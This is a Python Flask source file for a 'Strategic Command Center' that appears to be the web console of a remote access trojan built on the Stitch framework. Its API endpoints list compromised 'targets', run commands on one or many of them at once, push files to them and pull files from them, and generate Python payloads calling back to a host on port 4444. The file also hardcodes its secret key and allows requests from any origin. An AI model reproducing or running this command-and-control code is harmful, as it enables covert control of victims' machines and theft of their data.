#!/usr/bin/env python3
"""
Strategic Command Center - Web Application
No bullshit design with real-time architecture
"""

import os
import sys
import json
import time
import threading
from datetime import datetime

# Add workspace to path
sys.path.insert(0, '/workspace')

from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit
from flask_wtf.csrf import CSRFProtect
from werkzeug.security import generate_password_hash, check_password_hash

# Import strategic components
from strategic_command_center import init_strategic_center, get_strategic_center
from strategic_websocket import register_strategic_websocket_events

# Import existing components
try:
    from Application.stitch_cmd import get_stitch_server
    from Core.elite_executor import EliteCommandExecutor
    STITCH_AVAILABLE = True
except ImportError:
    STITCH_AVAILABLE = False

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'strategic_command_center_secret_key_2025'
app.config['WTF_CSRF_ENABLED'] = True

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True)

# Initialize strategic command center
strategic_center = None

def init_app():
    """Initialize the strategic web application"""
    global strategic_center
    
    # Initialize strategic command center
    strategic_center = init_strategic_center()
    
    # Register WebSocket events
    register_strategic_websocket_events(socketio, app.logger)
    
    # Register routes
    register_routes()
    
    app.logger.info("🎯 Strategic Command Center Web App initialized")

def register_routes():
    """Register Flask routes"""
    
    @app.route('/')
    def index():
        """Main strategic command center interface"""
        return render_template('strategic_command_center.html')
    
    @app.route('/api/targets')
    def api_get_targets():
        """Get all targets"""
        try:
            targets = strategic_center.get_targets()
            return jsonify({
                'success': True,
                'targets': targets,
                'count': len(targets)
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/targets/<target_id>')
    def api_get_target(target_id):
        """Get specific target"""
        try:
            target = strategic_center.get_target(target_id)
            if target:
                return jsonify({
                    'success': True,
                    'target': target
                })
            else:
                return jsonify({
                    'success': False,
                    'error': 'Target not found'
                }), 404
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/execute_command', methods=['POST'])
    def api_execute_command():
        """Execute command on target"""
        try:
            data = request.get_json()
            target_id = data.get('target_id')
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not target_id or not command:
                return jsonify({
                    'success': False,
                    'error': 'Missing target_id or command'
                }), 400
            
            command_id = strategic_center.execute_command(target_id, command, parameters)
            
            return jsonify({
                'success': True,
                'command_id': command_id
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/execute_parallel', methods=['POST'])
    def api_execute_parallel():
        """Execute command on multiple targets"""
        try:
            data = request.get_json()
            targets = data.get('targets', [])
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not targets or not command:
                return jsonify({
                    'success': False,
                    'error': 'Missing targets or command'
                }), 400
            
            command_ids = strategic_center.execute_parallel_commands(targets, command, parameters)
            
            return jsonify({
                'success': True,
                'command_ids': command_ids
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/upload_file', methods=['POST'])
    def api_upload_file():
        """Upload file to target"""
        try:
            data = request.get_json()
            target_id = data.get('target_id')
            filename = data.get('filename')
            content = data.get('content')  # Base64 encoded
            path = data.get('path', '/tmp/')
            
            if not all([target_id, filename, content]):
                return jsonify({
                    'success': False,
                    'error': 'Missing parameters'
                }), 400
            
            # Decode content
            import base64
            file_data = base64.b64decode(content)
            
            operation_id = strategic_center.upload_file(target_id, filename, file_data, path)
            
            return jsonify({
                'success': True,
                'operation_id': operation_id
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/download_file', methods=['POST'])
    def api_download_file():
        """Download file from target"""
        try:
            data = request.get_json()
            target_id = data.get('target_id')
            path = data.get('path')
            
            if not target_id or not path:
                return jsonify({
                    'success': False,
                    'error': 'Missing parameters'
                }), 400
            
            operation_id = strategic_center.download_file(target_id, path)
            
            return jsonify({
                'success': True,
                'operation_id': operation_id
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/command_results')
    def api_get_command_results():
        """Get command results"""
        try:
            limit = request.args.get('limit', 100, type=int)
            results = strategic_center.get_command_results(limit)
            
            return jsonify({
                'success': True,
                'results': results,
                'count': len(results)
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/file_operations')
    def api_get_file_operations():
        """Get file operations"""
        try:
            limit = request.args.get('limit', 100, type=int)
            operations = strategic_center.get_file_operations(limit)
            
            return jsonify({
                'success': True,
                'operations': operations,
                'count': len(operations)
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/system_stats')
    def api_get_system_stats():
        """Get system statistics"""
        try:
            stats = strategic_center.get_system_stats()
            return jsonify({
                'success': True,
                'stats': stats
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/generate_payload', methods=['POST'])
    def api_generate_payload():
        """Generate payload"""
        try:
            data = request.get_json()
            payload_type = data.get('type', 'python')
            host = data.get('host', '0.0.0.0')
            port = data.get('port', 4444)
            
            # Generate payload using existing system
            if STITCH_AVAILABLE:
                from Application.stitch_gen import win_gen_payload, posix_gen_payload
                
                if payload_type == 'python':
                    if os.name == 'nt':
                        payload_code = win_gen_payload(host, port)
                    else:
                        payload_code = posix_gen_payload(host, port)
                    
                    # Save payload
                    filename = f"strategic_payload_{int(time.time())}.py"
                    filepath = os.path.join('/tmp', filename)
                    
                    with open(filepath, 'w') as f:
                        f.write(payload_code)
                    
                    return jsonify({
                        'success': True,
                        'filename': filename,
                        'filepath': filepath,
                        'type': payload_type
                    })
                else:
                    return jsonify({
                        'success': False,
                        'error': f'Payload type {payload_type} not supported'
                    }), 400
            else:
                return jsonify({
                    'success': False,
                    'error': 'Payload generation not available'
                }), 500
                
        except Exception as e:
            return jsonify({
                'success': False,
                'error': str(e)
            }), 500
    
    @app.route('/api/health')
    def api_health():
        """Health check endpoint"""
        return jsonify({
            'status': 'healthy',
            'timestamp': time.time(),
            'strategic_center': strategic_center is not None,
            'stitch_available': STITCH_AVAILABLE
        })

# Initialize the app
if __name__ == '__main__':
    init_app()
    
    print("🎯 Strategic Command Center - Starting...")
    print("=" * 50)
    print("URL: http://localhost:5000")
    print("Design: No Bullshit - Everything has a purpose")
    print("=" * 50)
    
    # Run the app
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
else:
    # Initialize when imported
    init_app()